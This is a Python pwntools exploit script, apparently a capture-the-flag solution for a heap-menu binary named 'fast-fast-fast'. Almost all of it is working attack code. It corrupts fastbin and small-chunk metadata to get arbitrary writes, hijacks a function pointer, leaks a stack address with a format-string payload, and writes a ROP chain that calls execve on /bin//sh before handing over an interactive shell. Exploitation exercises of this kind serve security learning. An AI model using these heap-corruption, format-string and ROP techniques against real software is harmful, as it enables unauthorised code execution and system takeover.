#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-06 07:15:19
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/

from pwn import *
context(log_level="debug")
DEBUG = 1

if DEBUG:
	p = process('./fast-fast-fast')
	gdb.attach(p,"b*0x40141B\nc")
# else:
# 	p = remote()

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def create_fast(data):
	ru("saysecret\n")
	sl("1")
	ru("delet\n")
	sl('1')
	ru("\n")
	sl(data)

def edit_fast(data):
	ru("saysecret\n")
	sl("1")
	ru("delet\n")
	sl('2')
	ru("\n")
	sl(data)

def del_fast():
	ru("saysecret\n")
	sl("1")
	ru("delet\n")
	sl('3')

def create_small(data):
	ru("saysecret\n")
	sl("2")
	ru("delet\n")
	sl('1')
	ru("\n")
	sl(data)

def edit_small(data):
	ru("saysecret\n")
	sl("2")
	ru("delet\n")
	sl('2')
	ru("\n")
	sl(data)

def del_small():
	ru("saysecret\n")
	sl("2")
	ru("delet\n")
	sl('3')
def say():
	ru("saysecret\n")
	sl("3")
def edit(addr,data):
	edit_fast(p64(1)+p64(0xFB0)+p64(addr))#change small chunk
	edit_small(data)

def getchain():
	from struct import pack
	p = ''

	p += pack('<Q', 0x0000000000401b97) # pop rsi ; ret
	p += pack('<Q', 0x00000000006c1060) # @ .data
	p += pack('<Q', 0x000000000044d8e4) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x00000000004714a1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000401b97) # pop rsi ; ret
	p += pack('<Q', 0x00000000006c1068) # @ .data + 8
	p += pack('<Q', 0x000000000041c3cf) # xor rax, rax ; ret
	p += pack('<Q', 0x00000000004714a1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x0000000000401a83) # pop rdi ; ret
	p += pack('<Q', 0x00000000006c1060) # @ .data
	p += pack('<Q', 0x0000000000401b97) # pop rsi ; ret
	p += pack('<Q', 0x00000000006c1068) # @ .data + 8
	p += pack('<Q', 0x0000000000437835) # pop rdx ; ret
	p += pack('<Q', 0x00000000006c1068) # @ .data + 8
	p += pack('<Q', 0x000000000041c3cf) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464120) # add rax, 1 ; ret
	p += pack('<Q', 0x0000000000464e75) # syscall ; ret
	return p
create_fast("aaa")
del_fast()
create_small("aaa")
del_fast()
create_fast("aaa")
del_fast()
edit_small(p64(0x6C4Aa0))
say()
create_fast(p64(0x6C4A80))
edit(0x6C3750,p64(0x4082A0))
edit(0x6C2710,"%8$llX")
del_small()
stack_addr = int(ru("\n")[:12],16)-0x18
print "stack_addr="+hex(stack_addr)
edit(stack_addr,getchain())
p.interactive()